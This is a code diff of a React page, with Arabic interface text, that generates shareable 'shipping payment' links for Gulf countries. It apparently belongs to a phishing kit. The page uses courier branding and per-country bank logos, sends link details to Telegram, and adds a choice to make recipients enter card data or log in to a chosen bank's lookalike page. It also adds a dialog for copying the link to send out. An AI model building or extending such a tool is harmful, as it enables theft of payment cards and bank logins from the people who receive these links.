@@ -10,10 +10,19 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
+import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const CreateShippingLink = () => {
   const { country } = useParams();
@@ -27,7 +36,12 @@ const CreateShippingLink = () => {
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
+  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
   const [selectedBank, setSelectedBank] = useState("");
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
+  const [linkId, setLinkId] = useState("");
+  const [copied, setCopied] = useState(false);
   
   // Get banks for the selected country
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
@@ -65,7 +79,8 @@ const CreateShippingLink = () => {
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
-          selected_bank: selectedBank || null,
+          payment_method: paymentMethod,
+          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
         },
       });
       
@@ -83,6 +98,12 @@ const CreateShippingLink = () => {
         timestamp: new Date().toISOString()
       });
 
+      // حفظ الرابط وإظهار Dialog
+      const paymentUrl = `${window.location.origin}/pay/${link.id}/recipient?service=${selectedService}`;
+      setCreatedPaymentUrl(paymentUrl);
+      setLinkId(link.id);
+      setShowSuccessDialog(true);
+      
       if (telegramResult.success) {
         toast({
           title: "تم الإرسال بنجاح",
@@ -96,12 +117,28 @@ const CreateShippingLink = () => {
           variant: "destructive",
         });
       }
-
-      // Navigate to payment page with service parameter
-      navigate(`/pay/${link.id}/recipient?service=${selectedService}`);
     } catch (error) {
       console.error("Error creating link:", error);
     }
+  };
+  
+  const handleCopyLink = () => {
+    navigator.clipboard.writeText(createdPaymentUrl);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({
+      title: "تم النسخ!",
+      description: "تم نسخ الرابط إلى الحافظة",
+    });
+  };
+  
+  const handlePreview = () => {
+    window.open(createdPaymentUrl, '_blank');
+  };
+  
+  const handleContinue = () => {
+    setShowSuccessDialog(false);
+    navigate(`/pay/${linkId}/recipient?service=${selectedService}`);
   };
   
   if (!countryData) {
@@ -226,29 +263,72 @@ const CreateShippingLink = () => {
                 />
               </div>
               
-              {/* Bank Selection (Optional) */}
+              {/* Payment Method Selection */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <Building2 className="w-3 h-3" />
-                  البنك (اختياري)
+                  <CreditCard className="w-3 h-3" />
+                  طريقة الدفع *
                 </Label>
-                <Select value={selectedBank} onValueChange={setSelectedBank}>
-                  <SelectTrigger className="h-9">
-                    <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
+                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
+                  <SelectTrigger className="h-10">
+                    <SelectValue placeholder="اختر طريقة الدفع" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
-                    <SelectItem value="skip">بدون تحديد بنك</SelectItem>
-                    {banks.map((bank) => (
-                      <SelectItem key={bank.id} value={bank.id}>
-                        {bank.nameAr}
-                      </SelectItem>
-                    ))}
+                    <SelectItem value="card">
+                      <div className="flex items-center gap-2">
+                        <CreditCard className="w-4 h-4" />
+                        <span>بيانات البطاقة</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="bank_login">
+                      <div className="flex items-center gap-2">
+                        <Building2 className="w-4 h-4" />
+                        <span>تسجيل دخول البنك</span>
+                      </div>
+                    </SelectItem>
                   </SelectContent>
                 </Select>
                 <p className="text-xs text-muted-foreground mt-1">
-                  💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
+                  {paymentMethod === "card" 
+                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
+                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                 </p>
               </div>
+              
+              {/* Bank Selection (Only for bank_login) */}
+              {paymentMethod === "bank_login" && (
+                <div>
+                  <Label className="mb-2 flex items-center gap-2 text-sm">
+                    <Building2 className="w-3 h-3" />
+                    اختر البنك *
+                  </Label>
+                  <Select value={selectedBank} onValueChange={setSelectedBank}>
+                    <SelectTrigger className="h-10">
+                      <SelectValue placeholder="اختر البنك" />
+                    </SelectTrigger>
+                    <SelectContent className="bg-background z-50">
+                      {banks.map((bank) => (
+                        <SelectItem key={bank.id} value={bank.id}>
+                          <div className="flex items-center gap-2">
+                            {bank.logo && (
+                              <img 
+                                src={bank.logo} 
+                                alt={bank.nameAr}
+                                className="h-5 w-5 object-contain"
+                                onError={(e) => e.currentTarget.style.display = 'none'}
+                              />
+                            )}
+                            <span>{bank.nameAr}</span>
+                          </div>
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                  <p className="text-xs text-muted-foreground mt-1">
+                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
+                  </p>
+                </div>
+              )}
               
               {/* Submit Button */}
               <Button
@@ -269,6 +349,62 @@ const CreateShippingLink = () => {
           </Card>
         </div>
       </div>
+      
+      {/* Success Dialog with Copy and Preview buttons */}
+      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <AlertDialogContent className="max-w-md" dir="rtl">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-xl text-center">
+              ✅ تم إنشاء رابط الدفع بنجاح!
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-center">
+              يمكنك نسخ الرابط أو معاينته قبل المتابعة
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          
+          <div className="my-4">
+            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
+              {createdPaymentUrl}
+            </div>
+            
+            <div className="flex gap-2">
+              <Button
+                onClick={handleCopyLink}
+                variant="outline"
+                className="flex-1"
+              >
+                {copied ? (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    تم النسخ!
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    نسخ الرابط
+                  </>
+                )}
+              </Button>
+              
+              <Button
+                onClick={handlePreview}
+                variant="outline"
+                className="flex-1"
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                معاينة
+              </Button>
+            </div>
+          </div>
+          
+          <AlertDialogFooter>
+            <AlertDialogAction onClick={handleContinue} className="w-full">
+              <ArrowRight className="w-4 h-4 ml-2" />
+              متابعة للدفع
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
